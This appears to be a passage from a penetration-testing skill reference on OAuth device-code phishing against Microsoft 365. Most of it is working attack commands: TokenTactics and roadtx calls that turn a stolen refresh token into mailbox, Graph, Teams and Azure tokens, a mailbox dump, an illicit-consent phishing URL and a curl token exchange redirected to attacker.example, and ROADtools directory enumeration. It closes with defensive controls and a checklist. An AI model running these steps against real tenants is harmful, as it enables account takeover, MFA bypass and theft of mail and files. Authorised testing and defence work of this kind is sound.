# attacking-oauth-with-device-code-phishing — 详细参考（由 SKILL.md 拆分）

### Phase 4: Refresh Across Microsoft 365 Resources

The refresh token (with `offline_access`) can be redeemed for tokens scoped to other first-party resources, expanding access beyond the original scope.

1. Use TokenTactics refresh functions to pivot the refresh token to specific services:
   ```powershell
   # $response holds the device-code result from Get-AzureToken
   $rt = $response.refresh_token
   Invoke-RefreshToOutlookToken          -domain target.com -refreshToken $rt   # mailbox access
   Invoke-RefreshToMSGraphToken          -domain target.com -refreshToken $rt   # Graph
   Invoke-RefreshToMSTeamsToken          -domain target.com -refreshToken $rt   # Teams
   Invoke-RefreshToAzureCoreManagementToken -domain target.com -refreshToken $rt # ARM
   Invoke-RefreshToSubstrateToken        -domain target.com -refreshToken $rt
   ```
2. Equivalently with roadtx, redeem the refresh token for a new resource:
   ```bash
   roadtx refreshtokento \
     -r "$(python -c "import json;print(json.load(open('tokens.json'))['refresh_token'])")" \
     -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
     -s https://graph.microsoft.com/.default
   ```
3. Demonstrate mailbox access to prove impact (read-only, scoped to engagement rules):
   ```powershell
   Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder Inbox
   ```

### Phase 5: Illicit Consent Grant Variant

Instead of device-code, register a malicious multi-tenant app and phish the victim to consent to delegated Graph permissions for durable, password-reset-surviving access.

1. Register a multi-tenant app in an attacker tenant requesting delegated scopes such as `Mail.Read`, `Files.ReadWrite.All`, `offline_access`.
2. Build a user-consent URL and phish it:
   ```text
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     client_id=<ATTACKER_APP_ID>
     &response_type=code
     &redirect_uri=https://attacker.example/callback
     &response_mode=query
     &scope=offline_access%20Mail.Read%20Files.ReadWrite.All
     &state=12345
   ```
3. When the victim consents, exchange the returned `code` for tokens:
   ```bash
   curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
     -d 'client_id=<ATTACKER_APP_ID>' \
     -d 'grant_type=authorization_code' \
     -d 'code=<AUTH_CODE>' \
     -d 'redirect_uri=https://attacker.example/callback' \
     -d 'client_secret=<APP_SECRET>' \
     -d 'scope=offline_access Mail.Read Files.ReadWrite.All'
   ```
4. The consented OAuth grant persists as a service-principal grant in the victim tenant until an admin revokes it (`Remove-MgServicePrincipalOauth2PermissionGrant`).

### Phase 6: Enumerate Impact with ROADtools

1. Authenticate roadrecon with the captured token / refresh token and dump the directory:
   ```bash
   roadrecon auth --refresh-token "$(python -c "import json;print(json.load(open('tokens.json'))['refresh_token'])")" \
     -c d3590ed6-52b3-4102-aeff-aad2292ab01c
   roadrecon gather
   roadrecon gui   # browse users, groups, app registrations, role assignments
   ```
2. Identify high-value access: role assignments, owned applications, accessible SharePoint sites, and additional consent grants.
3. Record exactly what data and roles the stolen tokens reached for the engagement report.

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| TokenTactics v2 | Generate device codes and refresh tokens across M365 services | https://github.com/rvrsh3ll/TokenTactics |
| ROADtools (roadrecon / roadtx) | Token exchange, directory enumeration, access mapping | https://github.com/dirkjanm/ROADtools |
| AADInternals | Entra ID attack/recon PowerShell toolkit | https://github.com/Gerenios/AADInternals |
| RFC 8628 | OAuth 2.0 Device Authorization Grant specification | https://datatracker.ietf.org/doc/html/rfc8628 |
| Microsoft / Storm-2372 advisory | Device-code phishing campaign analysis | https://www.microsoft.com/en-us/security/blog/ |
| Mandiant M-Trends | OAuth token theft trend reporting | https://cloud.google.com/security/resources/m-trends |

## Defensive Recommendations

| Control | Effect |
|---------|--------|
| Conditional Access policy blocking the device-code flow (`authenticationFlows`) for users who do not need it | Removes the attack surface for most users |
| Phishing-resistant MFA (FIDO2 / passkeys) + token protection (token binding) | Bound tokens cannot be replayed off the victim device |
| Restrict user consent to verified publishers / require admin consent | Blocks illicit-consent grants |
| Sign-in frequency + shorter session lifetimes on untrusted networks | Limits refresh-token longevity |
| Monitor `AADNonInteractiveUserSignInLogs` for device-code grants and anomalous token use | Detection (see `hunting-saas-sso-token-abuse`) |

## Validation Criteria

- [ ] Device-code request returned a valid `user_code` and `device_code`
- [ ] Pretext delivered referencing the genuine Microsoft device-login page (no harvesting link)
- [ ] Token endpoint polled and `access_token` + `refresh_token` captured
- [ ] Access token decoded to confirm captured identity, audience, and scopes
- [ ] Refresh token successfully exchanged for at least one additional M365 resource
- [ ] MFA bypass demonstrated (victim completed MFA; attacker holds usable tokens)
- [ ] Illicit-consent variant tested or documented as out of scope
- [ ] Accessible resources enumerated with ROADtools and recorded
- [ ] Remediation recommendations (CA device-code block, FIDO2, consent restrictions) delivered
